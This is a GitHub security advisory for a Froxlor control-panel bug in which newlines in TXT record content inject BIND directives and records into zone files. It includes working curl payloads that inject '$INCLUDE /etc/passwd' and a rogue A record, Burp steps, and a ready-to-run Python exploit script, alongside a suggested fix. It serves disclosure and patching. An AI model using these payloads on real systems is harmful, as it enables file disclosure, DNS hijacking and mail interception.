# [H] Froxlor: BIND Zone File Injection via TXT Record Content

## Summary
Severity: High
Advisory: GHSA-37m5-m4q3-fc6x
CVE: CVE-2026-41234
CWE: CWE-74
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:L (CVSS_V3)
Published: 2026-06-03
Source: https://github.com/advisories/GHSA-37m5-m4q3-fc6x
Type: github-advisory

## Affected
- Packagist: `froxlor/froxlor` — affected >=0 <2.3.7

## Details
## Summary

The `DomainZones.add` API endpoint does not sanitize newline characters in TXT record content. An authenticated customer with DNS editing enabled can inject newlines into TXT record values, which break out of the record line in the generated BIND zone file. This enables injection of arbitrary BIND directives (`$INCLUDE`, `$GENERATE`) and arbitrary DNS records (A, MX, CNAME) into the zone file written to disk by the DNS rebuild cron.

This is an incomplete fix for CVE-2026-30932 (GHSA-x6w6-2xwp-3jh6), which patched the same newline injection for LOC, RP, SSHFP, and TLSA record types but did not patch TXT records.

## Affected Code

`lib/Froxlor/Api/Commands/DomainZones.php`, lines 306-308:

```php
} elseif ($type == 'TXT' && !empty($content)) {
    // check that TXT content is enclosed in " "
    $content = Dns::encloseTXTContent($content);
}
```

`Dns::encloseTXTContent()` (`lib/Froxlor/Dns/Dns.php:571-592`) only adds or removes surrounding quote characters. It does not strip newlines, carriage returns, or any BIND zone metacharacters.

Line 148 of `DomainZones.php` still contains:
```php
// TODO regex validate content for invalid characters
```

The content flows to the zone file via `DnsEntry::__toString()` (`lib/Froxlor/Dns/DnsEntry.php:83`), which concatenates `$this->content` directly into the zone line followed by `PHP_EOL`. Embedded newlines in the content produce additional lines in the zone file output.

### Comparison with CVE-2026-30932 fix

The v2.3.5 fix for CVE-2026-30932 added validation functions for these types:

| Type | Validation Added | Still Vulnerable? |
|------|-----------------|-------------------|
| LOC | `Validate::validateDnsLoc()` (strict regex) | No |
| RP | `Validate::validateDnsRp()` (domain validation) | No |
| SSHFP | `Validate::validateDnsSshfp()` (3-part split) | No |
| TLSA | `Validate::validateDnsTlsa()` (4-part split) | No |
| **TXT** | **`Dns::encloseTXTContent()` (quotes only)** | **Yes** |

## PoC

### Environment

- Froxlor 2.3.5, clean Docker install (Debian Bookworm, PHP 8.2, Apache 2.4)
- DNS enabled (`system.bind_enable=1`, `system.dnsenabled=1`)
- Customer with `dnsenabled=1`, domain with `isbinddomain=1`
- Customer has an API key (or uses the web UI DNS editor with Burp)

### Reproduction via API

```bash
# Inject $INCLUDE directive to read /etc/passwd
curl -s -u "API_KEY:API_SECRET" \
  -H 'Content-Type: application/json' \
  -d '{
    "command": "DomainZones.add",
    "params": {
      "domainname": "testdomain.lab",
      "type": "TXT",
      "record": "@",
      "content": "v=spf1 +all\"\n$INCLUDE /etc/passwd",
      "ttl": 18000
    }
  }' \
  https://panel.example.com/api.php
```

### Reproduction via Web UI (Burp)

1. Log in as a customer with DNS editing enabled
2. Navigate to Resources > Domains > (domain) > DNS Editor
3. Add a new record: Type = TXT, Record = @, Content = any
4. Intercept the POST request in Burp Suite
5. Change the `dns_content` parameter to: `v=spf1 +all"%0a$INCLUDE /etc/passwd`
   (`%0a` is URL-encoded newline)
6. Forward the request

### Result

The API returns the generated zone content. The TXT record line is split at the newline, and `$INCLUDE /etc/passwd` appears on its own line as a BIND directive:

```
$TTL 604800
$ORIGIN testdomain.lab.
@   604800  IN  SOA  froxlor.lab admin.froxlor.lab. 2026041004 ...
@   18000   IN  TXT  "v=spf1 +all"
$INCLUDE /etc/passwd"
@   604800  IN  A    100.95.188.127
*   604800  IN  A    100.95.188.127
```

When the DNS rebuild cron runs, BIND processes the `$INCLUDE` directive and attempts to read `/etc/passwd`.

### Variant: Arbitrary DNS record injection

The same technique injects arbitrary A/MX/CNAME records:

```bash
curl -s -u "API_KEY:API_SECRET" \
  -H 'Content-Type: application/json' \
  -d '{
    "command": "DomainZones.add",
    "params": {
      "domainname": "testdomain.lab",
      "type": "TXT",
      "record": "_spf",
      "content": "v=spf1 +all\"\nevil\t18000\tIN\tA\t6.6.6.6",
      "ttl": 18000
    }
  }' \
  https://panel.example.com/api.php
```

Result:

```
_spf   18000  IN  TXT  "v=spf1 +all"
evil   18000  IN  A    6.6.6.6
```

`evil.testdomain.lab` now resolves to attacker IP `6.6.6.6`.

### Automated PoC Script

```python
#!/usr/bin/env python3
"""Froxlor <= 2.3.5 TXT Zone Injection — Incomplete CVE-2026-30932 Fix"""
import json, sys, requests, urllib3
urllib3.disable_warnings()

def api(target, key, secret, cmd, params=None):
    return requests.post(f"{target.rstrip('/')}/api.php",
        auth=(key, secret), json={"command": cmd, "params": params or {}},
        verify=False).json()

target, key, secret, domain = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]

# Inject $INCLUDE
r = api(target, key, secret, "DomainZones.add", {
    "domainname": domain, "type": "TXT", "record": "@",
    "content": 'v=spf1 +all"\n$INCLUDE /etc/passwd', "ttl": 18000})

for line in r.get("data", []):
    tag = "   <-- INJECTED" if "$INCLUDE" in str(line) else ""
    if line: print(f"  {line}{tag}")

print("\nCONFIRMED" if any("$INCLUDE" in str(l) for l in r.get("data",[])) else "FAILED")
```

Usage: `python3 poc.py https://panel.example.com API_KEY API_SECRET domain.tld`

## Impact

1. **Information Disclosure**: `$INCLUDE` directs BIND to read arbitrary world-readable files on the server. The included content is parsed as zone data and can be retrieved by the customer via `DomainZones.listing` or DNS queries to records created from parsed file lines.

2. **DNS Record Injection**: Newline breakout allows injection of A, MX, CNAME, and other records into the zone file. A customer can point subdomains to attacker-controlled IPs, intercept email via MX injection, or perform subdomain takeover via CNAME injection.

3. **DNS Service Disruption**: Malformed zone content causes BIND to reject the zone, creating a DNS outage for the affected domain. `$GENERATE` directives can create massive record sets for amplification.

## Suggested Fix

Strip newlines and BIND metacharacters from TXT content. Minimal fix:

```php
// lib/Froxlor/Api/Commands/DomainZones.php, around line 306
} elseif ($type == 'TXT' && !empty($content)) {
    // Strip characters that can break zone file format
    $content = str_replace(["\n", "\r", "\t"], '', $content);
    $content = Dns::encloseTXTContent($content);
}
```

A more comprehensive fix would add a validation function (similar to `validateDnsLoc`, `validateDnsSshfp`, etc.) that rejects any content containing zone metacharacters (`$`, newlines), and remove the TODO at line 148.

## References
- https://github.com/froxlor/froxlor/security/advisories/GHSA-37m5-m4q3-fc6x
- https://nvd.nist.gov/vuln/detail/CVE-2026-41234
- https://github.com/advisories/GHSA-x6w6-2xwp-3jh6
- https://github.com/froxlor/froxlor
- https://github.com/froxlor/froxlor/releases/tag/2.3.7
